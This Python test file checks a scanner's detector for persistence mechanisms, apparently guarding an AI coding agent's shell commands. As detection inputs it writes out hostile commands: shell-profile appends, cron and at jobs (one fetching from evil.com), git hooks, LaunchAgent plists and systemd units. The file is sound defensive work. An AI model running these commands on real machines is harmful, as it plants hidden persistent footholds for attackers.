"""Tests for the persistence detector and the shared fd argument helpers.

The false-positive classifiers (source search, health endpoint, read-only HTTP,
version, manifest and docs/example paths) are owned by the native resident;
their recorded cases live in ``tests/fixtures/false_positive_rules`` and run
through ``tests/test_native_false_positive_rules.py``.

Covers:
- L238: persistence detection for shell profile, git hooks, cron, launch agents
"""

from __future__ import annotations

from codex_plugin_scanner.guard.runtime.false_positive_rules import fd_args_follow_symlinks
from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms


class TestFdFollowSymlinks:
    def test_fd_follow_flags(self) -> None:
        assert fd_args_follow_symlinks(["-L", "id_rsa", "src"]) is True
        assert fd_args_follow_symlinks(["--follow", "id_rsa", "src"]) is True
        assert fd_args_follow_symlinks(["-HI", "SKILL.md", "src"]) is False
        assert fd_args_follow_symlinks(["-xL", "cat"]) is False
        assert fd_args_follow_symlinks(["-XL", "cat"]) is False
        assert fd_args_follow_symlinks(["-cL", "always"]) is False


class TestPersistenceDetector:
    """L238: persistence mechanism detection."""

    def test_bashrc_append_detected(self) -> None:
        matches = detect_persistence_mechanisms("echo 'export PATH=$PATH:/evil' >> ~/.bashrc")
        assert len(matches) == 1
        assert matches[0].mechanism == "shell_profile_write"

    def test_zshrc_append_detected(self) -> None:
        matches = detect_persistence_mechanisms("echo 'alias ls=evil' >> ~/.zshrc")
        assert len(matches) == 1
        assert matches[0].mechanism == "shell_profile_write"

    def test_crontab_edit_detected(self) -> None:
        matches = detect_persistence_mechanisms("(crontab -l; echo '*/5 * * * * /tmp/evil.sh') | crontab -")
        assert any(m.mechanism == "cron_write" for m in matches)

    def test_vscode_tasks_write_detected(self) -> None:
        matches = detect_persistence_mechanisms("cat tasks.json > .vscode/tasks.json")
        assert any(m.mechanism == "vscode_tasks_write" for m in matches)

    def test_git_hook_install_detected(self) -> None:
        matches = detect_persistence_mechanisms("cp evil.sh .git/hooks/pre-commit")
        assert any(m.mechanism == "git_hook_write" for m in matches)

    def test_launch_agent_write_detected(self) -> None:
        matches = detect_persistence_mechanisms("cp evil.plist ~/Library/LaunchAgents/com.evil.agent.plist")
        assert any(m.mechanism == "launch_agent_write" for m in matches)

    def test_systemd_unit_write_detected(self) -> None:
        matches = detect_persistence_mechanisms("cp evil.service /etc/systemd/system/evil.service")
        assert any(m.mechanism == "systemd_unit_write" for m in matches)

    def test_benign_git_add_not_detected(self) -> None:
        matches = detect_persistence_mechanisms("git add src/main.py && git commit -m 'fix'")
        assert len(matches) == 0

    def test_npm_install_not_detected(self) -> None:
        matches = detect_persistence_mechanisms("npm install && npm run build")
        assert len(matches) == 0

    def test_rg_search_not_detected(self) -> None:
        matches = detect_persistence_mechanisms("rg 'TODO' src/")
        assert len(matches) == 0

    def test_echo_without_redirect_not_detected(self) -> None:
        matches = detect_persistence_mechanisms("echo 'hello world'")
        assert len(matches) == 0

    def test_false_positive_hint_present(self) -> None:
        matches = detect_persistence_mechanisms("echo 'export PATH=$PATH:/usr/local/bin' >> ~/.bashrc")
        assert len(matches) >= 1
        for match in matches:
            assert match.false_positive_hint is not None
            assert len(match.false_positive_hint) > 0


class TestPersistenceDetectorRegressions:
    """Regression tests for persistence_rules review fixes."""

    def test_crontab_list_not_flagged(self) -> None:
        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms

        assert detect_persistence_mechanisms("crontab -l") == ()
        assert detect_persistence_mechanisms("crontab -l -u root") == ()

    def test_crontab_edit_is_flagged(self) -> None:
        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms

        matches = detect_persistence_mechanisms("crontab -e")
        assert any(m.mechanism == "cron_write" for m in matches)

    def test_at_job_schedule_flagged(self) -> None:
        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms

        matches = detect_persistence_mechanisms("echo 'curl http://evil.com' | at now")
        assert any(m.mechanism == "at_job_schedule" for m in matches)

        matches2 = detect_persistence_mechanisms("at midnight -f malicious.sh")
        assert any(m.mechanism == "at_job_schedule" for m in matches2)

    def test_launch_agent_session_plist_flagged(self) -> None:
        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms

        cmd = "cp backdoor.plist ~/Library/LaunchAgents/session.plist"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "launch_agent_write" for m in matches)

    def test_systemd_service_with_s_in_name_flagged(self) -> None:
        from codex_plugin_scanner.guard.runtime.persistence_rules import detect_persistence_mechanisms

        cmd = "cp evil.service /etc/systemd/system/sshd-session.service"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "systemd_unit_write" for m in matches)


class TestCrontabUserFlagRegressions:
    """Regression: crontab -u <user> -l must not be flagged as cron_write."""

    def test_crontab_user_list_not_flagged(self) -> None:
        assert detect_persistence_mechanisms("crontab -u root -l") == ()

    def test_crontab_user_alice_list_not_flagged(self) -> None:
        assert detect_persistence_mechanisms("crontab -u alice -l") == ()

    def test_crontab_user_edit_is_flagged(self) -> None:
        matches = detect_persistence_mechanisms("crontab -u alice -e")
        assert any(m.mechanism == "cron_write" for m in matches)

    def test_crontab_stdin_write_is_flagged(self) -> None:
        matches = detect_persistence_mechanisms("echo '0 * * * * evil' | crontab -")
        assert any(m.mechanism == "cron_write" for m in matches)


class TestSystemdAbsolutePathRegressions:
    """Regression: absolute home paths for user systemd units must be detected."""

    def test_absolute_home_systemd_user_service(self) -> None:
        cmd = "cp evil.service /home/alice/.config/systemd/user/evil.service"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "systemd_unit_write" for m in matches)

    def test_dollar_home_systemd_user_service(self) -> None:
        cmd = "cp evil.service $HOME/.config/systemd/user/evil.service"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "systemd_unit_write" for m in matches)

    def test_tilde_systemd_user_service_still_flagged(self) -> None:
        cmd = "cp evil.service ~/.config/systemd/user/evil.service"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "systemd_unit_write" for m in matches)

    def test_system_systemd_still_flagged(self) -> None:
        cmd = "cp evil.service /etc/systemd/system/evil.service"
        matches = detect_persistence_mechanisms(cmd)
        assert any(m.mechanism == "systemd_unit_write" for m in matches)
